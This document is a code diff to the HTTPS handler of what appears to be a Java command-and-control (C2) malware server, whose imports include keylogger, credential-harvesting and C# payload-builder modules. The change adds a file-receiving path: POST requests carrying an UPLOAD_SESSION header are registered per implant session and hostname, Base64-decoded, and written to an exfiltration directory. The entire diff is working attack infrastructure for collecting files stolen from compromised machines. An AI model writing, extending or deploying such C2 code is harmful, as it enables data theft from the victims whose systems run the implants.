@@ -38,6 +38,7 @@ import c2.KeyloggerProcessor;
 import c2.file.CSharpPayloadBuilder;
 import c2.file.FileHelper;
 import c2.session.IOManager;
+import c2.session.filereceiver.FileReceiverDatagramHandler;
 
 public class HTTPSManager extends C2Interface {
 
@@ -62,6 +63,8 @@ public class HTTPSManager extends C2Interface {
 	private HarvestProcessor harvester;
 
 	private CountDownLatch startLatch = new CountDownLatch(1);
+	
+	private FileReceiverDatagramHandler fileReceiverProcessor;
 
 	public void initialize(IOManager io, Properties prop, KeyloggerProcessor keyProcessor, HarvestProcessor harvester) {
 		this.properties = prop;
@@ -70,6 +73,7 @@ public class HTTPSManager extends C2Interface {
 		this.io = io;
 		this.keyProcessor = keyProcessor;
 		this.harvester = harvester;
+		fileReceiverProcessor = new FileReceiverDatagramHandler(Paths.get(prop.getProperty(Constants.DAEMON_EXFILTEST_DIRECTORY)));
 	}
 
 	public void stop() {
@@ -331,6 +335,22 @@ public class HTTPSManager extends C2Interface {
 					System.out.println("Responding to session: " + sessionId + "with: " + response);
 				}
 			} else if (t.getRequestMethod().equals("POST")) {
+				String uploadSession = t.getRequestHeaders().getFirst("UPLOAD_SESSION");
+				if(uploadSession != null && uploadSession.length() != 0) {
+					int uploadSessionInt = Integer.parseInt(uploadSession);
+					if(!fileReceiverProcessor.hasSessionCurrently(sessionId, uploadSessionInt)) {
+						fileReceiverProcessor.registerNewSession(sessionId, uploadSessionInt, hostname);
+					}
+					try {
+						InputStreamReader isr = new InputStreamReader(t.getRequestBody(), "utf-8");
+						BufferedReader br = new BufferedReader(isr);
+						String dataStr = br.readLine();
+						byte[] data = Base64.getDecoder().decode(dataStr);
+						fileReceiverProcessor.processIncoming(sessionId, uploadSessionInt, data);
+					}catch(Exception ex) {
+						ex.printStackTrace();
+					}
+				}else {
 				InputStreamReader isr = new InputStreamReader(t.getRequestBody(), "utf-8");
 				BufferedReader br = new BufferedReader(isr);
 				StringBuilder commandOutput = new StringBuilder();
@@ -343,6 +363,7 @@ public class HTTPSManager extends C2Interface {
 					System.out.println("Session: " + sessionId + ", submitted: " + commandOutput.toString());
 				}
 				io.sendIO(sessionId, commandOutput.toString());
+				}
 			}
 			t.getResponseHeaders().add("Access-Control-Allow-Origin", "*");
 			t.sendResponseHeaders(200, response.getBytes().length);
